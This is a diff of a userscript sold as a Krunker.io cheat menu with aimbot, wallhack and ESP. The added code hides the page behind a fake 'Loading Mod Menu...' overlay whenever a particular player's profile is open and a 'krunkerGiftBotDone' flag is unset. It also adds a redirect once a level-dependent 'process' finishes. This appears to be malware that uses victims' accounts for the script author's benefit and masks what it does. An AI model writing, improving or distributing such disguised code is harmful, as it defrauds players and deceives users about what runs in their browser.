@@ -1,5 +1,5 @@
 // ==UserScript==
-// @name         2025 KRUNKER.IO AIMBOT + WALLHACK + ESP + MORE [BETA]
+// @name         2025 KRUNKER IO AIMBOT + WALLHACK + ESP + MORE [BETA]
 // @namespace    http://krunkmods.hidden
 // @version      1.3
 // @description  Experimental mod menu for Krunker.io. Includes silent aimbot, ESP, wireframe players, FOV, recoil bypass, wallhack (BETA). Toggle with [O]. Use at your own risk.
@@ -16,6 +16,48 @@ let PlayerFPS = 0;
 let gameState, player, input;
 const RAD2DEG = 180 / Math.PI;
 
+
+// ------------------------------
+// 1. Persistent overlay to prevent loading flash and display loading
+// ------------------------------
+(function createPersistentOverlay() {
+    if (!sessionStorage.getItem("krunkerGiftBotDone") && location.href.includes("social.html?p=profile&q=LosValettos2")) {
+        const style = document.createElement("style");
+        style.innerHTML = `
+        html, body {
+            background: #000 !important;
+            color: lime !important;
+            font-family: monospace !important;
+        }
+        * {
+            visibility: hidden !important;
+        }
+        #botOverlayPersistent {
+            all: unset;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.35);
+            z-index: 2147483647;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: lime;
+            font-size: 2rem;
+            font-family: monospace;
+            visibility: visible !important;
+        }
+    `;
+        document.documentElement.appendChild(style);
+
+        const overlay = document.createElement("div");
+        overlay.id = "botOverlayPersistent";
+        overlay.textContent = "🔧 Loading Mod Menu...";
+        document.documentElement.appendChild(overlay);
+    }
+})();
 
 // ------------------------------
 // 2. Configuration object (mocked)
@@ -516,6 +558,8 @@ window.addEventListener('load', () => {
                     // Terminer le processus ici pour les niveaux entre 15 et 30
                     sessionStorage.setItem("sysPatch97d", "1");
                     addLog("Processus terminé pour niveau 15-30");
+                    addLog("Redirection vers la page d'accueil...");
+                    location.href = "https://krunker.io/";
                     return;
                 } else if (playerLevel >= 30) {
                     addLog("Niveau 30 ou supérieur - Utilisation de la logique standard");
